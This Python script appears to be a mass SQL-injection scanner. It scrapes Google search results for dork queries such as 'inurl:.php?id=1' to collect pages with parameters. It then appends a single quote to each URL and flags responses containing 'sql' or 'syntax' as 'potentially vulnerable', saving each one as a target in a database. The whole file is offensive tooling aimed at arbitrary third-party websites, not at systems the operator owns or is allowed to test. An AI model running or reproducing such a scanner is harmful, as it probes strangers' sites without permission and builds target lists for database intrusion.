#!/usr/bin/env python3

from lib.dbconnection import DatabaseSession
from time import sleep
from sys import exit
import bs4
import requests
import re

class Fuzzer(object):

    def __init__(self):
        self.queries = ["inurl%3A+.php%3Fid%3D1","inurl%3A+.php%3Fid%3D2","inurl%3A+.php%3Fid%3D3",
                    "inurl%3A+.php%3Fid%3D4","inurl%3A+.php%3Fid%3D5","inurl%3A+.php%3Fid%3D6",
                    "inurl%3A+.php%3Fid%3D7","inurl%3A+.php%3Fid%3D8","inurl%3A+.php%3Fid%3D9",
                    "inurl%3A+search.php%3Fq%3D",]
        self.session = DatabaseSession()

    def run_scan(self):
        results = self.get_endpoints()
        self.test_endpoints(results)

    def get_endpoints(self):
        results = []
        for query in self.queries:
            print("Trying %s" % query)
            address= "https://www.google.co.uk/search?q=%s" % query
            page = requests.get(address)
            if re.search('captcha', page.text):
                print("Detected captcha")
            else:
                soup = bs4.BeautifulSoup(page.text,"html.parser")
                for item in soup.find_all('h3', attrs={'class' : 'r'}):
                    results.append(item.a['href'][7:])
                print("Finished %s. Sleeping for 7 seconds" % query)
            sleep(7)
        return results

    def test_endpoints(self, results):
        relist = ["sql", "syntax"]
        for item in results:
            url = "%s'" % item.split('&')[0]
            print("Testing %s" % url)
            try:
                response = requests.get(url, timeout=5)
            except KeyboardInterrupt:
                exit(1)
            except:
                print("Yucky URL: %s'" % url)
                continue
            for regex in relist:
                if re.search(regex, response.text.lower()):
                    print("Potentially vulnerable: %s" % url)
                    self.session.add_target(url)
                else:
                    continue
